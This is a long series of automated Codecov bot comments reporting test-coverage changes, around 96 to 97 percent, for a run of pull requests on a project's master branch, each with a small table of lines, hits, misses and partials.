97.19%\nMerging #1385 into master will increase coverage by 0.02%\n\ndiff\n@@             master      #1385   diff @@\n==========================================\n  Files            86         86          \n  Lines         10099      10218   +119   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1820     +2   \n==========================================\n+ Hits           9813       9931   +118   \n  Misses          158        158          \n- Partials        128        129     +1\n\nPowered by Codecov. Last updated by c47d5c5...9ba224e\n. ## Current coverage is 97.19%\nMerging #1387 into master will increase coverage by 0.02%\n\ndiff\n@@             master      #1387   diff @@\n==========================================\n  Files            86         86          \n  Lines         10110      10128    +18   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1820       1820          \n==========================================\n+ Hits           9824       9844    +20   \n+ Misses          158        157     -1   \n+ Partials        128        127     -1\n\nPowered by Codecov. Last updated by 5d5d0e9...d591cf3\n. ## Current coverage is 97.21%\nMerging #1390 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1390   diff @@\n==========================================\n  Files            86         86          \n  Lines         10256      10256          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1821       1821          \n==========================================\n- Hits           9971       9970     -1   \n  Misses          157        157          \n- Partials        128        129     +1\n\nPowered by Codecov. Last updated by 9643b55...84c6f15\n. ## Current coverage is 97.23%\nMerging #1392 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1392   diff @@\n==========================================\n  Files            86         86          \n  Lines         10285      10293     +8   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1821       1823     +2   \n==========================================\n+ Hits          10000      10008     +8   \n  Misses          157        157          \n  Partials        128        128\n\nPowered by Codecov. Last updated by 7e34237...c24ec71\n. ## Current coverage is 97.22%\nMerging #1394 into master will not change coverage\n\ndiff\n@@             master      #1394   diff @@\n==========================================\n  Files            86         86          \n  Lines         10285      10285          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1821       1821          \n==========================================\n  Hits          10000      10000          \n  Misses          157        157          \n  Partials        128        128\n\nPowered by Codecov. Last updated by 7e34237...303dc98\n. ## Current coverage is 97.21%\nMerging #1395 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1395   diff @@\n==========================================\n  Files            86         86          \n  Lines         10285      10282     -3   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1821       1823     +2   \n==========================================\n- Hits           9999       9996     -3   \n  Misses          157        157          \n  Partials        129        129\n\nPowered by Codecov. Last updated by 4638dd0...6212eae\n. ## Current coverage is 97.23%\nMerging #1396 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1396   diff @@\n==========================================\n  Files            86         86          \n  Lines         10285      10303    +18   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1821       1821          \n==========================================\n+ Hits           9999      10018    +19   \n  Misses          157        157          \n+ Partials        129        128     -1\n\nPowered by Codecov. Last updated by 4638dd0...b6cfb18\n. ## Current coverage is 97.21%\nMerging #1397 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1397   diff @@\n==========================================\n  Files            86         86          \n  Lines         10311      10286    -25   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1822     -1   \n==========================================\n- Hits          10026      10000    -26   \n  Misses          157        157          \n- Partials        128        129     +1\n\nPowered by Codecov. Last updated by ce3c0a1...7490b05\n. ## Current coverage is 97.22%\nMerging #1398 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1398   diff @@\n==========================================\n  Files            86         86          \n  Lines         10294      10294          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n- Hits          10009      10008     -1   \n  Misses          157        157          \n- Partials        128        129     +1\n\nPowered by Codecov. Last updated by 093a0a5...a33ed68\n. ## Current coverage is 97.23%\nMerging #1399 into master will not change coverage\n\ndiff\n@@             master      #1399   diff @@\n==========================================\n  Files            86         86          \n  Lines         10312      10312          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1824       1824          \n==========================================\n  Hits          10027      10027          \n  Misses          157        157          \n  Partials        128        128\n\nPowered by Codecov. Last updated by 8b574c3...479e120\n. ## Current coverage is 97.22%\nMerging #1400 into master will not change coverage\n\ndiff\n@@             master      #1400   diff @@\n==========================================\n  Files            86         86          \n  Lines         10282      10282          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits           9997       9997          \n  Misses          157        157          \n  Partials        128        128\n\nPowered by Codecov. Last updated by bf160e7...3bff648\n. ## Current coverage is 97.22%\nMerging #1402 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1402   diff @@\n==========================================\n  Files            86         86          \n  Lines         10312      10282    -30   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1824       1823     -1   \n==========================================\n- Hits          10027       9997    -30   \n  Misses          157        157          \n  Partials        128        128\n\nPowered by Codecov. Last updated by 8b574c3...1b730ef\n. ## Current coverage is 97.24%\nMerging #1407 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1407   diff @@\n==========================================\n  Files            86         86          \n  Lines         10294      10306    +12   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10009      10022    +13   \n+ Misses          157        156     -1   \n  Partials        128        128\n\nPowered by Codecov. Last updated by 093a0a5...6499494\n. ## Current coverage is 97.23%\nMerging #1410 into master will not change coverage\n\ndiff\n@@             master      #1410   diff @@\n==========================================\n  Files            86         86          \n  Lines         10294      10294          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10009      10009          \n  Misses          157        157          \n  Partials        128        128\n\nPowered by Codecov. Last updated by 093a0a5...4c738f5\n. ## Current coverage is 97.25%\nMerging #1411 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1411   diff @@\n==========================================\n  Files            86         86          \n  Lines         10306      10307     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10022      10024     +2   \n  Misses          156        156          \n+ Partials        128        127     -1\n\nPowered by Codecov. Last updated by bd24a7b...726ffed\n. ## Current coverage is 97.25%\nMerging #1414 into master will not change coverage\n\ndiff\n@@             master      #1414   diff @@\n==========================================\n  Files            86         86          \n  Lines         10307      10307          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10024      10024          \n  Misses          156        156          \n  Partials        127        127\n\nPowered by Codecov. Last updated by 65f1c4f...0b58eb9\n. ## Current coverage is 97.25%\nMerging #1415 into master will not change coverage\n\ndiff\n@@             master      #1415   diff @@\n==========================================\n  Files            86         86          \n  Lines         10307      10307          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10024      10024          \n  Misses          156        156          \n  Partials        127        127\n\nPowered by Codecov. Last updated by fc06280...64a523e\n. ## Current coverage is 97.26%\nMerging #1416 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1416   diff @@\n==========================================\n  Files            86         86          \n  Lines         10307      10306     -1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10024      10024          \n  Misses          156        156          \n+ Partials        127        126     -1\n\nPowered by Codecov. Last updated by 728f432...edce5cc\n. ## Current coverage is 97.18%\nMerging #1419 into master will decrease coverage by 0.07%\n\ndiff\n@@             master      #1419   diff @@\n==========================================\n  Files            86         86          \n  Lines         10307      10367    +60   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10024      10075    +51   \n- Misses          156        165     +9   \n  Partials        127        127\n\nPowered by Codecov. Last updated by 728f432...f369a5c\n. ## Current coverage is 97.25%\nMerging #1420 into master will not change coverage\n\ndiff\n@@             master      #1420   diff @@\n==========================================\n  Files            86         86          \n  Lines         10306      10306          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10023      10023          \n  Misses          157        157          \n  Partials        126        126\n\nPowered by Codecov. Last updated by 275fade...8337cc8\n. ## Current coverage is 97.24%\nMerging #1421 into master will not change coverage\n\ndiff\n@@             master      #1421   diff @@\n==========================================\n  Files            86         86          \n  Lines         10306      10306          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10022      10022          \n  Misses          157        157          \n  Partials        127        127\n\nPowered by Codecov. Last updated by 06155ed...2bbac3f\n. ## Current coverage is 97.24%\nMerging #1422 into master will not change coverage\n\ndiff\n@@             master      #1422   diff @@\n==========================================\n  Files            86         86          \n  Lines         10306      10306          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10022      10022          \n  Misses          157        157          \n  Partials        127        127\n\nPowered by Codecov. Last updated by 06155ed...feaf8bf\n. ## Current coverage is 97.24%\nMerging #1424 into master will not change coverage\n\ndiff\n@@             master      #1424   diff @@\n==========================================\n  Files            86         86          \n  Lines         10306      10306          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10022      10022          \n  Misses          157        157          \n  Partials        127        127\n\nPowered by Codecov. Last updated by 06155ed...ab91c2a\n. ## Current coverage is 97.25%\nMerging #1426 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1426   diff @@\n==========================================\n  Files            86         86          \n  Lines         10306      10306          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10022      10023     +1   \n  Misses          157        157          \n+ Partials        127        126     -1\n\nPowered by Codecov. Last updated by f3a2207...451379d\n. ## Current coverage is 97.19%\nMerging #1427 into master will decrease coverage by 0.06%\n\ndiff\n@@             master      #1427   diff @@\n==========================================\n  Files            86         86          \n  Lines         10306      10365    +59   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10023      10074    +51   \n- Misses          157        165     +8   \n  Partials        126        126\n\nPowered by Codecov. Last updated by 275fade...fab0088\n. ## Current coverage is 97.25%\nMerging #1428 into master will not change coverage\n\ndiff\n@@             master      #1428   diff @@\n==========================================\n  Files            86         86          \n  Lines         10306      10306          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10023      10023          \n  Misses          157        157          \n  Partials        126        126\n\nPowered by Codecov. Last updated by 275fade...ee7fe42\n. ## Current coverage is 97.18%\nMerging #1429 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1429   diff @@\n==========================================\n  Files            86         86          \n  Lines         10370      10370          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n- Hits          10079      10078     -1   \n  Misses          165        165          \n- Partials        126        127     +1\n\nPowered by Codecov. Last updated by 85b1afe...c8669f8\n. ## Current coverage is 97.24%\nMerging #1430 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1430   diff @@\n==========================================\n  Files            86         86          \n  Lines         10384      10384          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1825       1825          \n==========================================\n- Hits          10099      10098     -1   \n- Misses          159        160     +1   \n  Partials        126        126\n\nPowered by Codecov. Last updated by 81fa282...51ad83c\n. ## Current coverage is 97.19%\nMerging #1432 into master will not change coverage\n\ndiff\n@@             master      #1432   diff @@\n==========================================\n  Files            86         86          \n  Lines         10367      10367          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10076      10076          \n  Misses          165        165          \n  Partials        126        126\n\nPowered by Codecov. Last updated by c5fa364...69b0640\n. ## Current coverage is 97.21%\nMerging #1433 into master will increase coverage by 0.02%\n\ndiff\n@@             master      #1433   diff @@\n==========================================\n  Files            86         86          \n  Lines         10367      10370     +3   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10076      10081     +5   \n+ Misses          165        164     -1   \n+ Partials        126        125     -1\n\nPowered by Codecov. Last updated by c5fa364...43c87d5\n. ## Current coverage is 97.19%\nMerging #1435 into master will not change coverage\n\ndiff\n@@             master      #1435   diff @@\n==========================================\n  Files            86         86          \n  Lines         10367      10367          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10076      10076          \n  Misses          165        165          \n  Partials        126        126\n\nPowered by Codecov. Last updated by c5fa364...90f5039\n. ## Current coverage is 97.19%\nMerging #1436 into master will not change coverage\n\ndiff\n@@             master      #1436   diff @@\n==========================================\n  Files            86         86          \n  Lines         10367      10367          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10076      10076          \n  Misses          165        165          \n  Partials        126        126\n\nPowered by Codecov. Last updated by c5fa364...9caf615\n. ## Current coverage is 97.18%\nMerging #1440 into master will not change coverage\n\ndiff\n@@             master      #1440   diff @@\n==========================================\n  Files            86         86          \n  Lines         10370      10370          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10078      10078          \n  Misses          165        165          \n  Partials        127        127\n\nPowered by Codecov. Last updated by a8051b5...3e99047\n. ## Current coverage is 97.17%\nMerging #1442 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1442   diff @@\n==========================================\n  Files            86         86          \n  Lines         10370      10370          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n- Hits          10078      10077     -1   \n  Misses          165        165          \n- Partials        127        128     +1\n\nPowered by Codecov. Last updated by a8051b5...e4d7c8c\n. ## Current coverage is 97.24%\nMerging #1443 into master will increase coverage by 0.06%\n\ndiff\n@@             master      #1443   diff @@\n==========================================\n  Files            86         86          \n  Lines         10370      10384    +14   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1825     +2   \n==========================================\n+ Hits          10078      10098    +20   \n+ Misses          165        160     -5   \n+ Partials        127        126     -1\n\nPowered by Codecov. Last updated by a8051b5...32dc867\n. ## Current coverage is 97.25%\nMerging #1444 into master will increase coverage by 0.07%\n\ndiff\n@@             master      #1444   diff @@\n==========================================\n  Files            86         86          \n  Lines         10370      10384    +14   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1825     +2   \n==========================================\n+ Hits          10078      10099    +21   \n+ Misses          165        159     -6   \n+ Partials        127        126     -1\n\nPowered by Codecov. Last updated by a8051b5...e15e930\n. ## Current coverage is 97.06%\nMerging #1446 into master will decrease coverage by 0.11%\n\ndiff\n@@             master      #1446   diff @@\n==========================================\n  Files            86         86          \n  Lines         10370      10402    +32   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1826     +3   \n==========================================\n+ Hits          10078      10097    +19   \n- Misses          165        177    +12   \n- Partials        127        128     +1\n\nPowered by Codecov. Last updated by a8051b5...13c0027\n. ## Current coverage is 97.24%\nMerging #1448 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1448   diff @@\n==========================================\n  Files            86         86          \n  Lines         10384      10377     -7   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1825       1822     -3   \n==========================================\n- Hits          10099      10091     -8   \n- Misses          159        160     +1   \n  Partials        126        126\n\nPowered by Codecov. Last updated by 81fa282...e7132b8\n. ## Current coverage is 96.71% (diff: 90.95%)\nMerging #1449 into master will decrease coverage by 0.39%\n\ndiff\n@@             master      #1449   diff @@\n==========================================\n  Files            86         87     +1   \n  Lines         10422      10709   +287   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1825       1893    +68   \n==========================================\n+ Hits          10121      10357   +236   \n- Misses          173        192    +19   \n- Partials        128        160    +32\n\nPowered by Codecov. Last update 5a43b68...c096bb0\n. ## Current coverage is 97.07% (diff: 100%)\nMerging #1452 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1452   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10430    +18   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10108      10125    +17   \n  Misses          177        177          \n- Partials        127        128     +1\n\nPowered by Codecov. Last update 3f3300f...60bdbb4\n. ## Current coverage is 97.23%\nMerging #1453 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1453   diff @@\n==========================================\n  Files            86         86          \n  Lines         10384      10384          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1825       1825          \n==========================================\n- Hits          10099      10097     -2   \n- Misses          159        160     +1   \n- Partials        126        127     +1\n\nPowered by Codecov. Last updated by 81fa282...16a216c\n. ## Current coverage is 97.08%\nMerging #1455 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1455   diff @@\n==========================================\n  Files            86         86          \n  Lines         10410      10412     +2   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10105      10108     +3   \n  Misses          177        177          \n+ Partials        128        127     -1\n\nPowered by Codecov. Last updated by c896f81...3c0c2ce\n. ## Current coverage is 96.84% (diff: 100%)\nMerging #1456 into master will not change coverage\n\ndiff\n@@             master      #1456   diff @@\n==========================================\n  Files            88         88          \n  Lines         10675      10675          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1818          \n==========================================\n  Hits          10338      10338          \n  Misses          194        194          \n  Partials        143        143\n\nPowered by Codecov. Last update 403226f...cd1b8e0\n. ## Current coverage is 97.07% (diff: 100%)\nMerging #1457 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1457   diff @@\n==========================================\n  Files            86         86          \n  Lines         10410      10410          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10105      10106     +1   \n  Misses          177        177          \n+ Partials        128        127     -1\n\nPowered by Codecov. Last update c896f81...626bd5c\n. ## Current coverage is 97.09% (diff: 100%)\nMerging #1458 into master will increase coverage by 0.02%\n\ndiff\n@@             master      #1458   diff @@\n==========================================\n  Files            86         86          \n  Lines         10410      10410          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10105      10108     +3   \n+ Misses          177        176     -1   \n+ Partials        128        126     -2\n\nPowered by Codecov. Last update c896f81...2fdd2f4\n. ## Current coverage is 97.07% (diff: 100%)\nMerging #1459 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1459   diff @@\n==========================================\n  Files            86         86          \n  Lines         10410      10410          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10105      10106     +1   \n  Misses          177        177          \n+ Partials        128        127     -1\n\nPowered by Codecov. Last update c896f81...169d5a4\n. ## Current coverage is 97.07% (diff: 100%)\nMerging #1460 into master will not change coverage\n\ndiff\n@@             master      #1460   diff @@\n==========================================\n  Files            86         86          \n  Lines         10410      10410          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10105      10105          \n  Misses          177        177          \n  Partials        128        128\n\nPowered by Codecov. Last update c896f81...89d7c76\n. ## Current coverage is 97.07% (diff: 100%)\nMerging #1461 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1461   diff @@\n==========================================\n  Files            86         86          \n  Lines         10410      10410          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10105      10106     +1   \n  Misses          177        177          \n+ Partials        128        127     -1\n\nPowered by Codecov. Last update c896f81...258d342\n. ## Current coverage is 97.08% (diff: 100%)\nMerging #1463 into master will not change coverage\n\ndiff\n@@             master      #1463   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10108      10108          \n  Misses          177        177          \n  Partials        127        127\n\nPowered by Codecov. Last update 80cdd21...3553acf\n. ## Current coverage is 97.08% (diff: 100%)\nMerging #1464 into master will not change coverage\n\ndiff\n@@             master      #1464   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10108      10108          \n  Misses          177        177          \n  Partials        127        127\n\nPowered by Codecov. Last update 80cdd21...7352024\n. ## Current coverage is 97.08% (diff: 100%)\nMerging #1467 into master will not change coverage\n\ndiff\n@@             master      #1467   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10108      10108          \n  Misses          177        177          \n  Partials        127        127\n\nPowered by Codecov. Last update 80cdd21...7f08cf0\n. ## Current coverage is 97.08% (diff: 100%)\nMerging #1468 into master will not change coverage\n\ndiff\n@@             master      #1468   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10108      10108          \n  Misses          177        177          \n  Partials        127        127\n\nPowered by Codecov. Last update 80cdd21...ff0b38b\n. ## Current coverage is 97.08% (diff: 100%)\nMerging #1469 into master will not change coverage\n\ndiff\n@@             master      #1469   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10108      10108          \n  Misses          177        177          \n  Partials        127        127\n\nPowered by Codecov. Last update 80cdd21...81914b8\n. ## Current coverage is 95.47% (diff: 100%)\nNo coverage report found for 3.0.0 at e831495.\nPowered by Codecov. Last update e831495...d00af15\n. ## Current coverage is 97.08% (diff: 100%)\nMerging #1475 into master will not change coverage\n\ndiff\n@@             master      #1475   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10108      10108          \n  Misses          177        177          \n  Partials        127        127\n\nPowered by Codecov. Last update 3f3300f...0d92758\n. ## Current coverage is 97.08% (diff: 100%)\nMerging #1476 into master will not change coverage\n\ndiff\n@@             master      #1476   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10108      10108          \n  Misses          177        177          \n  Partials        127        127\n\nPowered by Codecov. Last update 3f3300f...2916096\n. ## Current coverage is 97.07% (diff: 100%)\nMerging #1477 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1477   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n- Hits          10108      10107     -1   \n  Misses          177        177          \n- Partials        127        128     +1\n\nPowered by Codecov. Last update 3f3300f...c90d60b\n. ## Current coverage is 97.08% (diff: 100%)\nMerging #1478 into master will not change coverage\n\ndiff\n@@             master      #1478   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10108      10108          \n  Misses          177        177          \n  Partials        127        127\n\nPowered by Codecov. Last update 3f3300f...aeaff1e\n. ## Current coverage is 96.48% (diff: 91.31%)\nMerging #1480 into master will decrease coverage by 0.61%\n\ndiff\n@@             master      #1480   diff @@\n==========================================\n  Files            86         87     +1   \n  Lines         10412      10428    +16   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1790    -33   \n==========================================\n- Hits          10110      10061    -49   \n- Misses          176        205    +29   \n- Partials        126        162    +36\n\nPowered by Codecov. Last update e280cf0...1323850\n. ## Current coverage is 97.13% (diff: 100%)\nMerging #1481 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1481   diff @@\n==========================================\n  Files            86         86          \n  Lines         10422      10458    +36   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1825       1825          \n==========================================\n+ Hits          10121      10158    +37   \n  Misses          173        173          \n+ Partials        128        127     -1\n\nPowered by Codecov. Last update eff51dd...23b044f\n. ## Current coverage is 97.13% (diff: 95.65%)\nMerging #1485 into master will increase coverage by 0.03%\n\ndiff\n@@             master      #1485   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10414     +2   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10110      10116     +6   \n+ Misses          176        172     -4   \n  Partials        126        126\n\nPowered by Codecov. Last update e280cf0...cb2b895\n. ## Current coverage is 97.07% (diff: 100%)\nMerging #1487 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1487   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n- Hits          10108      10107     -1   \n  Misses          177        177          \n- Partials        127        128     +1\n\nPowered by Codecov. Last update 3f3300f...1f0a7b3\n. ## Current coverage is 97.09% (diff: 0.00%)\nMerging #1489 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1489   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits          10108      10110     +2   \n+ Misses          177        176     -1   \n+ Partials        127        126     -1\n\nPowered by Codecov. Last update e2ef170...132f78e\n. ## Current coverage is 97.09% (diff: 100%)\nMerging #1491 into master will not change coverage\n\ndiff\n@@             master      #1491   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10110      10110          \n  Misses          176        176          \n  Partials        126        126\n\nPowered by Codecov. Last update e3cb33b...9a8a812\n. ## Current coverage is 97.09% (diff: 100%)\nMerging #1492 into master will not change coverage\n\ndiff\n@@             master      #1492   diff @@\n==========================================\n  Files            86         86          \n  Lines         10412      10412          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n  Hits          10110      10110          \n  Misses          176        176          \n  Partials        126        126\n\nPowered by Codecov. Last update e3cb33b...1e9c0f8\n. ## Current coverage is 96.15% (diff: 100%)\nMerging #1500 into master will increase coverage by 0.08%\n\ndiff\n@@             master      #1500   diff @@\n==========================================\n  Files            89         89          \n  Lines         10722      10852   +130   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1826          \n==========================================\n+ Hits          10301      10435   +134   \n+ Misses          277        274     -3   \n+ Partials        144        143     -1\n\nPowered by Codecov. Last update dd6fd0a...4e9d822\n. ## Current coverage is 97.01% (diff: 94.92%)\nMerging #1503 into master will decrease coverage by 0.10%\n\ndiff\n@@             master      #1503   diff @@\n==========================================\n  Files            86         87     +1   \n  Lines         10461      10387    -74   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1797    -29   \n==========================================\n- Hits          10160      10077    -83   \n- Misses          173        182     +9   \n  Partials        128        128\n\nPowered by Codecov. Last update b875d02...4a02129\n. ## Current coverage is 96.98% (diff: 90.65%)\nMerging #1504 into master will decrease coverage by 0.04%\n\ndiff\n@@             master      #1504   diff @@\n==========================================\n  Files            87         88     +1   \n  Lines         10541      10638    +97   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1798       1814    +16   \n==========================================\n+ Hits          10228      10317    +89   \n+ Misses          183        179     -4   \n- Partials        130        142    +12\n\nPowered by Codecov. Last update 8360a92...9205299\n. ## Current coverage is 97.13% (diff: 100%)\nMerging #1507 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1507   diff @@\n==========================================\n  Files            86         86          \n  Lines         10461      10461          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1826          \n==========================================\n+ Hits          10160      10161     +1   \n  Misses          173        173          \n+ Partials        128        127     -1\n\nPowered by Codecov. Last update b875d02...9097e7e\n. ## Current coverage is 97.00% (diff: 100%)\nMerging #1508 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1508   diff @@\n==========================================\n  Files            87         87          \n  Lines         10387      10387          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1797          \n==========================================\n- Hits          10077      10076     -1   \n  Misses          182        182          \n- Partials        128        129     +1\n\nPowered by Codecov. Last update 6627538...4459512\n. ## Current coverage is 97.01% (diff: 100%)\nMerging #1509 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1509   diff @@\n==========================================\n  Files            87         87          \n  Lines         10387      10405    +18   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1797          \n==========================================\n+ Hits          10077      10094    +17   \n  Misses          182        182          \n- Partials        128        129     +1\n\nPowered by Codecov. Last update 6627538...debc297\n. ## Current coverage is 97.01% (diff: 100%)\nMerging #1511 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1511   diff @@\n==========================================\n  Files            87         87          \n  Lines         10405      10405          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1797          \n==========================================\n- Hits          10095      10094     -1   \n  Misses          182        182          \n- Partials        128        129     +1\n\nPowered by Codecov. Last update 6d035ca...da4c441\n. ## Current coverage is 97.04% (diff: 98.56%)\nMerging #1512 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1512   diff @@\n==========================================\n  Files            87         87          \n  Lines         10405      10507   +102   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1797          \n==========================================\n+ Hits          10095      10196   +101   \n- Misses          182        183     +1   \n  Partials        128        128\n\nPowered by Codecov. Last update 6d035ca...baf1659\n. ## Current coverage is 97.03% (diff: 100%)\nMerging #1513 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1513   diff @@\n==========================================\n  Files            87         87          \n  Lines         10405      10507   +102   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1797          \n==========================================\n+ Hits          10097      10195    +98   \n- Misses          181        183     +2   \n- Partials        127        129     +2\n\nPowered by Codecov. Last update 7ab65ec...fa68205\n. ## Current coverage is 97.03% (diff: 100%)\nMerging #1514 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1514   diff @@\n==========================================\n  Files            87         87          \n  Lines         10537      10537          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1797          \n==========================================\n- Hits          10226      10225     -1   \n  Misses          183        183          \n- Partials        128        129     +1\n\nPowered by Codecov. Last update 09bf68f...3799831\n. ## Current coverage is 97.03% (diff: 100%)\nMerging 